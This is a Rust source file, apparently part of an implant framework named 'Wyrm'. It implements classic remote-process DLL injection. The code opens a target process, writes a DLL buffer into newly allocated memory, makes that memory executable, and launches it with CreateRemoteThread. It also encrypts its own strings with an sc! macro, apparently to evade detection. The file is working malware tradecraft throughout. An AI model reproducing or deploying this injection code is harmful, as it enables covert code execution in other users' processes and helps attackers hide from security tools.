use std::{ffi::c_void, mem::transmute, ptr::null_mut};

use shared::tasks::WyrmResult;
use shared_no_std::export_resolver::{
    ExportError, calculate_memory_delta, find_export_from_unmapped_file,
};
use str_crypter::{decrypt_string, sc};
use windows_sys::Win32::{
    Foundation::{CloseHandle, FALSE, GetLastError, INVALID_HANDLE_VALUE},
    System::{
        Diagnostics::Debug::WriteProcessMemory,
        Memory::{
            MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE, PAGE_READWRITE, VirtualAllocEx,
            VirtualProtectEx,
        },
        Threading::{CreateRemoteThread, OpenProcess, PROCESS_ALL_ACCESS},
    },
};

pub fn virgin_inject(buf: &[u8], pid: u32) -> WyrmResult<String> {
    let h_process = unsafe { OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid) };

    if h_process.is_null() || h_process == INVALID_HANDLE_VALUE {
        let gle = unsafe { GetLastError() };
        return WyrmResult::Err(format!(
            "{} {gle:#X}",
            sc!("Failed to open process.", 176).unwrap()
        ));
    }

    let p_alloc = unsafe {
        VirtualAllocEx(
            h_process,
            null_mut(),
            buf.len(),
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE,
        )
    };

    if p_alloc.is_null() {
        let gle = unsafe { GetLastError() };
        unsafe { CloseHandle(h_process) };
        return WyrmResult::Err(format!(
            "{} {gle:#X}",
            sc!("Failed to allocate RW memory.", 173).unwrap()
        ));
    }

    //
    // Write the DLL content
    //
    let mut out = 0;
    unsafe { WriteProcessMemory(h_process, p_alloc, buf.as_ptr() as _, buf.len(), &mut out) };

    if out == 0 {
        unsafe { CloseHandle(h_process) };
        return WyrmResult::Err(sc!("Failed to write remote memory.", 173).unwrap());
    }

    //
    // Resolve the entry address
    //
    let p_entry = match find_entrypoint(&buf, p_alloc) {
        Ok(p) => unsafe { transmute::<_, extern "system" fn(_: *mut core::ffi::c_void) -> u32>(p) },
        Err(e) => {
            unsafe { CloseHandle(h_process) };
            return WyrmResult::Err(e);
        }
    };

    //
    // Mark mem rwx
    //
    let mut old_protect = 0;
    let vp = unsafe {
        VirtualProtectEx(
            h_process,
            p_alloc,
            buf.len(),
            PAGE_EXECUTE_READWRITE,
            &mut old_protect,
        )
    };

    if vp == 0 {
        let gle = unsafe { GetLastError() };
        unsafe { CloseHandle(h_process) };
        return WyrmResult::Err(format!(
            "{} {gle:#X}",
            sc!("Failed to change protection on remote memory.", 173).unwrap()
        ));
    }

    let mut thread_id = 0;

    let h_thread = unsafe {
        CreateRemoteThread(
            h_process,
            null_mut(),
            0,
            Some(p_entry),
            null_mut(),
            0,
            &mut thread_id,
        )
    };

    if h_thread.is_null() {
        let gle = unsafe { GetLastError() };
        unsafe { CloseHandle(h_process) };
        return WyrmResult::Err(format!(
            "{} {gle:#X}",
            sc!("Failed to create remote thread.", 173).unwrap()
        ));
    }

    WyrmResult::Ok(format!(
        "{} {pid}",
        sc!("Injected into process", 159).unwrap()
    ))
}

fn find_entrypoint(buf: &[u8], p_alloc: *const c_void) -> Result<*const c_void, String> {
    let p_entry = match find_export_from_unmapped_file(&buf, "Load") {
        Ok(p) => calculate_memory_delta(buf.as_ptr() as usize, p_alloc as usize),
        Err(e) => {
            let part = match e {
                ExportError::ImageTooSmall => sc!("Image too small", 65).unwrap(),
                ExportError::ImageUnaligned => sc!("Image not aligned", 65).unwrap(),
                ExportError::ExportNotFound => sc!("Export not found", 65).unwrap(),
            };

            let msg = format!(
                "{} {part}",
                sc!(
                    "Could not find the Shim address in the PE image to spawn.",
                    164
                )
                .unwrap()
            );
            #[cfg(debug_assertions)]
            {
                use crate::utils::console::print_failed;

                print_failed(&msg);
            }
            return Err(msg);
        }
    };

    if let Some(f) = p_entry {
        Ok(f as *const c_void)
    } else {
        Err(sc!("Could not calculate delta.", 173).unwrap())
    }
}
